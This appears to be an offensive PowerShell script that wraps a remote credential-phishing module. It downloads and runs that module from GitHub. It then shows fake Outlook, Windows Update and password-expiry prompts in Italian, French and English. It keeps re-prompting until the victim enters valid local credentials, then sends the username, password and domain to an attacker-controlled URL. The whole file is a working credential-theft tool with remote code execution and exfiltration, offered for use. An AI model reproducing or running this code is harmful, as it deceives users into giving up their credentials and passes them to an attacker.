function Invoke-CredPhisher 
{
<#
.SYNOPSIS
	This script wrap Invoke-CredentialPhisher and add validation function, then send valid credential to the 
    attacker url
.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.PARAMETER type
	Address of the handler.
.PARAMETER attackerurl
	Port of the handler.
.EXAMPLE
	C:\PS> Invoke-CredPhisher -type Office -attackerurl http://192.168.1.5/index.html
#>
	[CmdletBinding()]
    param (
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
		[ValidateSet("update","office","password")]
		[string]$type = "update",
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] 
		[string]$attackerurl = "http://192.168.1.5/index.html"
	    )
	
	iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-CredentialPhisher.ps1'))

    	$lang = GET-WinSystemLocale

    	switch ( $lang.Name )
	{
		"it-IT" { 
                    $toastTitleOffice = "Microsoft Office Outlook"
                    $toastMessageOffice = "La connessione a Microsoft Exchange è stata persa.`r`nClicca qui per ripristinare la connessione"
                    $credBoxTitleOffice = "Microsoft Outlook" 
                    $credBoxMessageOffice = "Inserisci la password per l'utente"

                    $toastTitleUpdate = "Aggiornamenti disponibili" 
                    $toastMessageUpdate = "Il computer si riavvierà in 5 minuti per installare gli aggiornamenti" 
                    $credBoxTitleUpdate = "Credenziali necessarie" 
                    $credBoxMessageUpdate = "Inserisci le tue credenziali per postporre l'aggiornamento"

                    $toastTitlePassword = "Valuta la possibilità di cambiare la tua password" 
                    $toastMessagePassword = "La tua password scadrà tra 5 minuti.`r`nPer cambiare la password, clicca qui o premi CTRL+ALT+DELETE e poi clicca 'Cambia password'." 
                    $credBoxTitlePassword = "Windows Password reset" 
                    $credBoxMessagePassword = "Inserisci la password per l'utente"
                }
		"fr-FR" {
                    $toastTitleOffice = "Microsoft Office Outlook"
                    $toastMessageOffice = "La connexion à Microsoft Exchange a été perdue.`r`nCliquez ici pour rétablir la connexion"
                    $credBoxTitleOffice = "Microsoft Outlook" 
                    $credBoxMessageOffice = "Entrez le mot de passe pour l'utilisateur"

                    $toastTitleUpdate = "Les mises à jour sont disponibles" 
                    $toastMessageUpdate = "Votre ordinateur redémarrera dans 5 minutes pour installer les mises à jour" 
                    $credBoxTitleUpdate = "Références requises" 
                    $credBoxMessageUpdate = "S'il vous plaît spécifier vos informations d'identification afin de reporter les mises à jour"

                    $toastTitlePassword = "Pensez à changer votre mot de passe" 
                    $toastMessagePassword = "Votre mot de passe expirera dans 5 minutes.`r`nPour changer votre mot de passe, cliquez ici ou appuyez sur  CTRL+ALT+DELETE puis cliquez sur 'Changer un mot de passe'." 
                    $credBoxTitlePassword = "Réinitialisation du mot de passe Windows" 
                    $credBoxMessagePassword = "Entrez le mot de passe pour l'utilisateur" 
                }
		default { 
                    $toastTitleOffice = "Microsoft Office Outlook"
                    $toastMessageOffice = "Connection to Microsoft Exchange has been lost.`r`nClick here to restore the connection"
                    $credBoxTitleOffice = "Microsoft Outlook" 
                    $credBoxMessageOffice = "Enter password for user"

                    $toastTitleUpdate = "Updates are available" 
                    $toastMessageUpdate = "Your computer will restart in 5 minutes to install the updates" 
                    $credBoxTitleUpdate = "Credentials needed" 
                    $credBoxMessageUpdate = "Please specify your credentials in order to postpone the updates"

                    $toastTitlePassword = "Consider changing your password" 
                    $toastMessagePassword = "Your password will expire in 5 minutes.`r`nTo change your password, click here or press CTRL+ALT+DELETE and then click 'Change a password'." 
                    $credBoxTitlePassword = "Windows Password reset" 
                    $credBoxMessagePassword = "Enter password for user"
                }
	}

	switch ( $type )
	{
		"office" { $out = Invoke-CredentialPhisher -ToastTitle $toastTitleOffice -ToastMessage $toastMessageOffice -Application "Outlook" -credBoxTitle $credBoxTitleOffice -credBoxMessage "$credBoxMessageOffice '{emailaddress|samaccountname}'" -ToastType Application -HideProcesses    }
		"update" { $out = Invoke-CredentialPhisher -ToastTitle $toastTitleUpdate -ToastMessage $toastMessageUpdate -credBoxTitle $credBoxTitleUpdate -credBoxMessage $credBoxMessageUpdate -ToastType System -Application "System Configuration"    }
		"password" { $out = Invoke-CredentialPhisher -ToastTitle $toastTitlePassword -ToastMessage $toastMessagePassword -Application "Control Panel" -credBoxTitle $credBoxTitlePassword -credBoxMessage "$credBoxMessagePassword '{samaccountname}'" -ToastType "Application"   }
		default { $out = Invoke-CredentialPhisher -ToastTitle $toastTitlePassword -ToastMessage $toastMessagePassword -Application "Control Panel" -credBoxTitle $credBoxTitlePassword -credBoxMessage "$credBoxMessagePassword '{samaccountname}'" -ToastType "Application"   }
	}

	$creds = Parse-Output($out)

	if($out.Count -eq 2)
	{
		Validate-or-Request $creds[0] $creds[1] $creds[2] $attackerurl
	}
}

function Parse-Output ([String[]] $out)
{
	$creds = "none","none","$env:userdomain"
	for($i = 0; $i -lt $out.Count; $i++)
	{
		if($out[$i] -match '\[\+\] Username: (?<Name>.+) \[\+\]')
		{
			$full = $Matches.Name.split('\\')
			if ($full.Count -ne 2)
			{
				$creds[0] = $full[0]
				$creds[2] = "$env:userdomain"
			}
			else
			{
				$creds[0] = $full[1]
				$creds[2] = $full[0]
			}
		}
		
		if($out[$i] -match '\[\+\] Password: (?<Password>.+) \[\+\]')
		{
			$creds[1] = $Matches.Password
		}
	}
	return $creds
}

function Validate-or-Request ([String] $username,[String] $password, [String] $domain, [String] $attackerurl)
{

	Import-PhishWinLib
	Add-Type -assemblyname System.DirectoryServices.AccountManagement
	$dirserv = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

    	$full = "$domain" + "\" + "$username"

	if ($dirserv.ValidateCredentials("$full", "$password") -eq $True)  
	{
		Send-Credentials $username $password $domain $attackerurl
		return
	}
    	else
    	{
		while($dirserv.ValidateCredentials("$full", "$password") -ne $True)
		{
			[bool]$save     = $false
			[int]$errorCode = 0
			[System.UInt32]$authPackage   = 0
			[System.UInt32]$dialogReturn  = 0  
			[System.UInt32]$outCredSize   = 0
			[System.IntPtr]$outCredBuffer = 0      

			$credUi = New-Object Phishwin.CredentialDialog+CREDUI_INFO
			$credUi.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($credUi)
			$credUi.pszCaptionText = "Credentials needed" 
			$credUi.pszMessageText = "Invalid Credentials, Please try again"  

			$dialogReturn = [Phishwin.CredentialDialog]::CredUIPromptForWindowsCredentials([ref]$credUi, 
					    $errorCode, 
					    [ref]$authPackage, 
					    0,0, 
					    [ref]$outCredBuffer, 
					    [ref]$outCredSize, 
					    [ref]$save, 
					    1)

			$maxBuffer = 300
			$usernameBuffer = New-Object System.Text.StringBuilder($maxBuffer)
			$passwordBuffer = New-Object System.Text.StringBuilder($maxBuffer)
			$domainBuffer   = New-Object System.Text.StringBuilder($maxBuffer)

			if ($dialogReturn -eq 0) 
			{
				if ([Phishwin.CredentialDialog]::CredUnPackAuthenticationBuffer(0, $outCredBuffer, $outCredSize, $usernameBuffer, [ref]$maxBuffer, $domainBuffer, [ref]$maxBuffer, $passwordBuffer, [ref]$maxBuffer)) 
				{
					[Phishwin.CredentialDialog]::CoTaskMemFree($outCredBuffer)

					$username = $usernameBuffer.ToString()
					$domain = $domainBuffer.ToString()
					$password = $passwordBuffer.ToString()	
					
					if($username.Split('\\').Count -gt 1){
						$full = "$username"
					}
					else
					{
						$full = "$domain" + "\" + "$username"
					}

					$dirserv = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
					if($dirserv.ValidateCredentials("$full", "$password") -eq $True) 
					{
						Send-Credentials $username $password $domain $attackerurl
					}          								
				}
			} 
		}
    	}
}

function Send-Credentials([String] $username, [String] $password, [String] $domain, [String] $attackerurl)
{
	$wc = New-Object system.Net.WebClient;
 	$username = [System.Web.HttpUtility]::UrlEncode($username);
 	$password = [System.Web.HttpUtility]::UrlEncode($password);
 	$domain = [System.Web.HttpUtility]::UrlEncode($domain);
 	Try
	{
 		$res = $wc.downloadString("$($attackerurl)?user=$($username)&pass=$($password)&domain=$($domain)")
 	}
	Catch
	{
    }	
}